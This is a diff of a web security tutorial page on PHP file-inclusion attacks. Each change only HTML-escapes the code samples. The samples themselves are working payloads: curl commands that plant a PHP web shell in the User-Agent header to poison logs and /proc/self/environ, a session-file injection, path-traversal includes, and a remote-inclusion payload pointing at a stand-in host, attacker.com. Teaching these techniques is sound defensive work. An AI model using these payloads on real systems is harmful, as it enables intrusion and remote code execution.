@@ -99,7 +99,7 @@ include($_GET['file']);</code></pre>
             <h3>LFI to RCE — Log Poisoning</h3>
             <p>If you can read the web server's access log via LFI, you can poison it with PHP code by injecting it into the User-Agent header. The next LFI request executes the poisoned log entry.</p>
             <pre><code># Step 1: Poison the log with PHP payload in User-Agent
-curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
+curl -H "User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;" http://target.com/
 
 # Step 2: Include the log via LFI
 ?page=../../../../var/log/apache2/access.log&cmd=id
@@ -108,7 +108,7 @@ curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
 
             <h3>LFI to RCE — /proc/self/environ</h3>
             <pre><code># Inject PHP in User-Agent
-curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target.com/
+curl -H "User-Agent: &lt;?php system(\$_GET['c']); ?&gt;" http://target.com/
 
 # Include the environ file
 ?page=../../../../proc/self/environ&c=whoami</code></pre>
@@ -116,7 +116,7 @@ curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target.com/
             <h3>LFI to RCE — PHP Session File</h3>
             <pre><code># PHP stores sessions in /tmp/sess_SESSIONID
 # 1. Set a session cookie and inject PHP in a parameter that gets stored in session:
-?username=<?php system($_GET['cmd']); ?>
+?username=&lt;?php system($_GET['cmd']); ?&gt;
 
 # 2. Include the session file:
 ?page=../../../../tmp/sess_abc123&cmd=id</code></pre>
@@ -133,7 +133,7 @@ include($page . '.php');
             <h3>Remote File Inclusion (RFI)</h3>
             <p>RFI requires <code>allow_url_include = On</code> in php.ini (disabled by default in modern PHP). If enabled, the attacker can include a remote PHP file they control, achieving instant RCE.</p>
             <pre><code>// Attacker hosts: http://attacker.com/shell.php
-// Content: <?php system($_GET['cmd']); ?>
+// Content: &lt;?php system($_GET['cmd']); ?&gt;
 
 // RFI payload
 ?page=http://attacker.com/shell
